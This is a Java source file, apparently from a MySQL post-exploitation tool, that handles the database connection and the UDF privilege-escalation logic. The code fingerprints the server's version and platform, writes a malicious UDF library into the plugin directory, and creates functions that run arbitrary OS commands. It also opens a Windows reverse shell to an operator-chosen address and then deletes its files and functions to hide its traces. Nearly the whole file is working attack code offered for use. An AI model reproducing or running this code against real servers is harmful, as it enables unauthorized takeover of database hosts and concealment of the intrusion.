package Dao;

import Util.DriverLoader;
import Util.JdbcProfiles;
import Util.Reporter;
import Util.Utils;

import java.io.File;
import java.sql.*;
import java.text.MessageFormat;
import java.util.ArrayList;
import java.util.List;
import java.util.Properties;

import Util.MysqlSqlUtil;

/**
 * @author ch1ng & j1anFen
 * CLI 化解耦（M1）：仅换输出口——Controller/TextArea → Reporter；config.yaml → JdbcProfiles；
 * DriverManager+addURL → DriverLoader。业务逻辑（SQL 模板/UDF 链）零改动。
 */
public class MysqlDao {
    private String JARFILE;
    private String JDBCURL;
    private String DRIVER;
    private String USERNAME;
    private String PASSWORD;

    private Connection CONN = null;

    private String version;
    private String mysqlPlatform;
    private String systemPlatform;
    private String randomPluginFile;
    private List<String> tempFiles = new ArrayList<String>();
    private String remoteOutfile;
    private String udfFullPath;
    private String pluginFile;
    private String reversePluginFile;


    /**
     * 统一输出口（原 MysqlController 日志框；缺省空实现，宿主经 setReporter 注入）
     */
    private Reporter reporter = Reporter.NONE;

    public void setReporter(Reporter reporter) {
        this.reporter = reporter;
    }

    public MysqlDao(String ip, String port, String database, String username, String password, String timeout) throws Exception {
        // 零配置：驱动与 URL 模板取自 JdbcProfiles（原 config.yaml 的 Mysql.* 三项）
        JARFILE = JdbcProfiles.driverPath(JdbcProfiles.MYSQL_JAR);
        JDBCURL = JdbcProfiles.MYSQL_URL;
        DRIVER = JdbcProfiles.MYSQL_CLASS;
        // 进行时间转换
        timeout = String.valueOf(Integer.parseInt(timeout) * 1000);
        JDBCURL = MessageFormat.format(JDBCURL, ip, port, database, timeout);
        USERNAME = username;
        PASSWORD = password;
    }

    /**
     * 连接属性（user/password；SOCKS5 入站代理走进程级 socksProxy* 系统属性，见 cli 侧）
     */
    private Properties connectProps() {
        Properties props = new Properties();
        props.setProperty("user", USERNAME);
        props.setProperty("password", PASSWORD);
        return props;
    }

    /**
     * 测试是否成功连接上数据库，不需要持久化连接
     *
     * @return
     * @throws java.sql.SQLException
     */
    public void testConnection() throws Exception {
        if (CONN == null || CONN.isClosed()) {
            // DriverLoader：子加载器 + Driver#connect 直连（JDK8+，无 DriverManager 信任检查）
            CONN = DriverLoader.connect(JARFILE, DRIVER, JDBCURL, connectProps());
            closeConnection();
        }
    }

    public Connection getConnection() throws Exception {
        if (CONN == null || CONN.isClosed()) {
            CONN = DriverLoader.connect(JARFILE, DRIVER, JDBCURL, connectProps());
        }
        return CONN;
    }

    public void closeConnection() throws java.sql.SQLException {
        if (CONN != null) {
            CONN.close();
        }
    }

    /**
     * udf 初始化
     */
    private void initUDF() {
        // UDF初始化
        try {
            if (this.version != null && this.mysqlPlatform != null && this.systemPlatform != null) {
                this.versionOutfile();
                this.Option();
                reporter.log(Utils.log("本地UDF初始化成功,可尝试进行UDF提权"));
            } else {
                reporter.log(Utils.log("mysql版本信息获取有误"));
            }
        } catch (Exception e) {
            reporter.error(e.getMessage(), e);
        }
    }

    /**
     * 获取数据库基本信息
     */
    public void getInfo() {
        try {
            // 1.sql语句
            String sql = MysqlSqlUtil.getInfoSql;

            // 2.获取SQL执行者
            PreparedStatement st = CONN.prepareStatement(sql);

            // 3.执行sql语句
            ResultSet rs = st.executeQuery();

            // 4.处理数据
            while (rs.next()) {
                String[] udfinfo = rs.getString("udfinfo").split("~");
                this.version = udfinfo[0];
                this.mysqlPlatform = udfinfo[1];
                this.systemPlatform = udfinfo[2];
            }
            String res = Utils.log(String.format("Mysql版本：%s 系统平台：%s 系统位数：%s", this.version, this.mysqlPlatform,
                    this.systemPlatform));
            reporter.log(res);
            this.initUDF();
        } catch (SQLException ex) {
            reporter.error(ex.getMessage(), ex);
        }
    }

    /**
     * 确定本地使用udf函数文件路径
     * 测试发现win64系统下安装win32 mysql dll库依赖32位mysql 64失效
     */
    private void Option() {
        try {
            String path = null;
            if (mysqlPlatform.startsWith("Win")) {
                reporter.log(Utils.log("windows服务器udf失败可尝试直接反弹shell"));
                int versionNumber = Integer.parseInt(mysqlPlatform.substring(3));
                if (versionNumber == 32) {
                    path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mysql" + File.separator + "udf_win32_hex.txt";
                    pluginFile = Utils.readFile(path);
                } else {
                    path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mysql" + File.separator + "udf_win64_hex.txt";
                    pluginFile = Utils.readFile(path);
                }
            } else {
                if (systemPlatform.contains("64")) {
                    path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mysql" + File.separator + "udf_linux64_hex.txt";
                    pluginFile = Utils.readFile(path);
                } else {
                    path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mysql" + File.separator + "udf_linux32_hex.txt";
                    pluginFile = Utils.readFile(path);
                }
            }
        } catch (Exception e) {
            reporter.error(e.getMessage(), e);
        }
    }

    /**
     * 确定导出路径
     * MySQL<5.0，导出路径随意；
     * 5.0 <= MySQL<5.1，则需要导出至目标服务器的系统目录（如：c:/windows/system32/）
     * MySQL 5.1以上版本，必须要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数。
     */
    public void versionOutfile() throws SQLException {
        if (this.version != null) {
            String[] versions = version.split("\\.");
            if (Integer.parseInt(versions[0]) < 5) {
                if (mysqlPlatform.startsWith("Win")) {
                    remoteOutfile = "c:\\windows\\temp\\";
                } else {
                    remoteOutfile = "/tmp/";
                }
            } else {
                this.plugin_dir();
            }
        }
    }

    /**
     * mysql >= 5.1 获取插件目录
     */
    private void plugin_dir() throws SQLException {

        String sql = MysqlSqlUtil.pluginDirSql;
        PreparedStatement st = CONN.prepareStatement(sql);
        ResultSet rs = st.executeQuery();
        while (rs.next()) {
            remoteOutfile = rs.getString("plugin_dir");
            if (mysqlPlatform.startsWith("Win")) {
                remoteOutfile = remoteOutfile.replace("\\", "\\\\");
            }
        }
    }

    /**
     * 导入插件和初始化函数
     */
    public void udf(String funcEvil) {
        String content;
        try {
            if (funcEvil.equals("backshell")) {
                content = reversePluginFile;
            } else {
                content = pluginFile;
            }

            // 清除遗留函数
            this.removeEvilFunc();

            // 初始化完整udf导出路径
            randomPluginFile = Long.toHexString(Double.doubleToLongBits(Math.random())) + ".temp";

            // 清理所有残留临时文件
            tempFiles.add(randomPluginFile);

            // 获取完整导出路径
            udfFullPath = remoteOutfile + randomPluginFile;

            String sql = String.format(MysqlSqlUtil.udfExportSql, content,udfFullPath);

            // 3.获取SQL执行者
            PreparedStatement st = CONN.prepareStatement(sql);

            // 5.执行sql语句
            st.execute();
            reporter.log(Utils.log("库文件写入成功"));
            //PublicUtil.log("插件UDF写入成功");

            String sqlEval = String.format(MysqlSqlUtil.createFunctionSql,funcEvil,randomPluginFile);
            //System.out.println(sqlEval);
            PreparedStatement st1 = CONN.prepareStatement(sqlEval);
            st1.execute();
            reporter.log(Utils.log("函数 " + funcEvil + " 创建执行成功"));
        } catch (Exception e) {
            reporter.error(e.getMessage(), e);
        }
    }



    /**
     * 执行命令
     *
     * @param command
     * @return
     */
    public String eval(String command, String code) {
        try {
            String sql = String.format(MysqlSqlUtil.evalSql, command);
            PreparedStatement st = CONN.prepareStatement(sql);
            ResultSet rs = st.executeQuery();
            while (rs.next()) {
                String ss = new String(rs.getBytes("s"), code);
                return ss;
            }
        } catch (NullPointerException e) {
            return "命令执行完成";
        } catch (Exception e) {
            String res = e.getMessage();
            if (res.contains("does not exist")) {
                reporter.log(Utils.log("命令函数不存在！请创建！"));
                return "";
            }
            reporter.error(e.getMessage(), e);
        }
        return "";
    }

    /**
     * backShell win反弹shell
     *
     * @throws SQLException
     */
    public String backShell(String reverseAddress, int port, String code) {
        try {
            String sql = String.format(MysqlSqlUtil.reverseShellSql, reverseAddress, port);
            PreparedStatement st = CONN.prepareStatement(sql);
            ResultSet rs = st.executeQuery();
            while (rs.next()) {
                return new String(rs.getBytes("s"), code);
            }
        } catch (NullPointerException e) {
            return "命令执行完成";
        } catch (Exception e) {
            reporter.error(e.getMessage(), e);
        }
        return "";
    }

    /**
     * ntfs 创建目录
     *
     * @throws SQLException
     */
    public void ntfsdir() {
        try {
            String sql = String.format(MysqlSqlUtil.ntfsCreateDirectory,remoteOutfile.substring(0, remoteOutfile.length() - 1) );
            PreparedStatement st = CONN.prepareStatement(sql);
            st.execute();
            reporter.log(Utils.log("目录创建成功"));
        } catch (Exception e) {
            String res = e.getMessage();
            if (res.contains("already exists")) {
                reporter.log(Utils.log("目录已存在！"));
                return;
            }
            reporter.error(e.getMessage(), e);
        }
    }

    /**
     * win 反弹shell
     *
     * @throws SQLException
     */
    public void reverseShell(String reverseAddress, String reversePort, String code) {
        try {
            // 重新加载反弹shell dll
            String path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mysql" + File.separator + "udf_win_ex_hex.txt";
            reversePluginFile = Utils.readFile(path);
            this.udf("backshell");
            backShell(reverseAddress, Integer.parseInt(reversePort), code);
        } catch (Exception e) {
            reporter.error(e.getMessage(), e);
        }
    }

    public void removeEvilFunc() {
        try {
            String cleanSql = MysqlSqlUtil.cleanSql;
            PreparedStatement st1 = CONN.prepareStatement(cleanSql);
            st1.execute();

            String cleanSql1 = MysqlSqlUtil.cleanSql2;
            PreparedStatement st2 = CONN.prepareStatement(cleanSql1);
            st2.execute();
        } catch (Exception e) {
            reporter.error(e.getMessage(), e);
        }
    }

    /**
     * 清理痕迹
     *
     * @throws SQLException
     */
    public void cleanudf() {
        String rmplugin = null;

        try {
            reporter.log(Utils.log("删除服务器UDF遗留文件"));
            String tempPath = remoteOutfile + "*.temp";
            if (mysqlPlatform.startsWith("Win")) {
                rmplugin = "del /f " + tempPath;
            } else {
                rmplugin = "rm -f " + tempPath;
            }
            eval(rmplugin, "UTF-8");
            reporter.log(Utils.log("卸载所有恶意函数"));
            // 删除恶意函数
            this.removeEvilFunc();

        } catch (Exception e) {
            reporter.error(e.getMessage(), e);
        }
    }

    // ---- 只读状态访问器（CLI dispatcher 结构化 info 用；不影响既有行为） ----
    public String getVersion() {
        return version;
    }

    public String getMysqlPlatform() {
        return mysqlPlatform;
    }

    public String getSystemPlatform() {
        return systemPlatform;
    }

    public String getRemoteOutfile() {
        return remoteOutfile;
    }

    public String getUdfFullPath() {
        return udfFullPath;
    }

    /** 供 dispatcher 探测 sys_eval 是否已部署（select 1+1 形式不可用时返回 false） */
    public boolean sysEvalExists() {
        try (PreparedStatement st = CONN.prepareStatement(MysqlSqlUtil.evalSql.replace("%s", "1"));
             ResultSet rs = st.executeQuery()) {
            while (rs.next()) {
                rs.getString("s");
                return true;
            }
        } catch (Exception e) {
            return false;
        }
        return false;
    }


    /**
     * 原生 SQL 直通（CLI sql 命令用；结果集按行列拼接，tab 分隔；不改变既有方法）
     */
    public String runSql(String sql, String code) throws Exception {
        StringBuilder res = new StringBuilder();
        PreparedStatement st = CONN.prepareStatement(sql);
        try {
        boolean has = st.execute();
        if (has) {
            ResultSet rs = st.getResultSet();
            ResultSetMetaData md = rs.getMetaData();
            int n = md.getColumnCount();
            while (rs.next()) {
                for (int i = 1; i <= n; i++) {
                    String v;
                    try {
                        byte[] b = rs.getBytes(i);
                        v = b == null ? "NULL" : new String(b, code == null || code.isEmpty() ? "UTF-8" : code);
                    } catch (Exception e) {
                        v = rs.getString(i);
                    }
                    res.append(v == null ? "NULL" : v);
                    if (i < n) {
                        res.append('\t');
                    }
                }
                res.append('\n');
            }
        } else {
            res.append("affected:").append(st.getUpdateCount()).append('\n');
        }
        return res.toString();
        } finally {
            st.close();
        }
    }
}
